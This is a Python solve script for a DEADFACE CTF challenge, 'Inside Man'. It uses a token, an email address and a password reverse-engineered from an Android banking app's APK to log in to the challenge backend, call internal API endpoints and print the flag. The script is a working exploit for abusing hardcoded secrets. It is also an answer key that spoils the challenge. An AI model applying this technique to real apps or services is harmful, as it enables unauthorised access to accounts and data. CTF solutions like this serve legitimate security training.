#!/usr/bin/env python3
"""
Inside Man  -  DEADFACE CTF  (syyntax / @syyntax)

Everything needed is hardcoded inside app-release.apk (package com.demonne.financial):

  BuildConfig.API_BASE_URL        = http://dmf.dctf.io:8081
  ApiClient.INTERNAL_API_TOKEN    = zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR
                                     -> sent as header  X-Internal-Token  (InternalTokenInterceptor)
  LoginActivity.INTERNAL_ACCOUNT  = audit@demonne-financial.local
  LoginActivity.INTERNAL_PASS     = demonnefinancial

Logging is off (ApiClient -> HttpLoggingInterceptor.setLevel(NONE)), so the account
can only be recovered by reversing the app.  The backend then hands back the
welcome "message" for that account - data no normal customer can see.
"""
import json
import sys
import urllib.error
import urllib.request

BASE = "http://dmf.dctf.io:8081"
INTERNAL_TOKEN = "zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR"
EMAIL = "audit@demonne-financial.local"
PASSWORD = "demonnefinancial"


def call(path, method="GET", body=None, bearer=None, internal=True):
    headers = {"Accept": "application/json", "User-Agent": "okhttp/4.12.0"}
    if internal:
        headers["X-Internal-Token"] = INTERNAL_TOKEN
    if bearer:
        headers["Authorization"] = "Bearer " + bearer
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            status, payload = resp.status, resp.read()
    except urllib.error.HTTPError as e:
        status, payload = e.code, e.read()
    try:
        return status, json.loads(payload)
    except Exception:
        return status, payload.decode("utf-8", "replace")


def main():
    print("[*] POST /api/auth/login  (hardcoded dev/audit account)")
    status, body = call("/api/auth/login", method="POST",
                        body={"email": EMAIL, "password": PASSWORD})
    print(f"    -> {status} {json.dumps(body)}")
    if status != 200 or "token" not in body:
        sys.exit("login failed")

    token = body["token"]
    user = body.get("user", {})
    print(f"\n[*] account used : {user.get('email')}  (id={user.get('id')}, {user.get('name')})")
    print(f"[*] JWT          : {token}")

    print("\n[*] GET /api/auth/me  (token only, no X-Internal-Token)")
    print("    ->", call("/api/auth/me", bearer=token, internal=False))
    print("[*] GET /api/auth/me  (X-Internal-Token only, no bearer)")
    print("    ->", call("/api/auth/me", bearer=None, internal=True))
    print("[*] GET /api/accounts")
    print("    ->", call("/api/accounts", bearer=token))

    flag = user.get("message", "")
    print("\n" + "=" * 62)
    print("FLAG:", flag)
    print("=" * 62)
    return 0


if __name__ == "__main__":
    sys.exit(main())
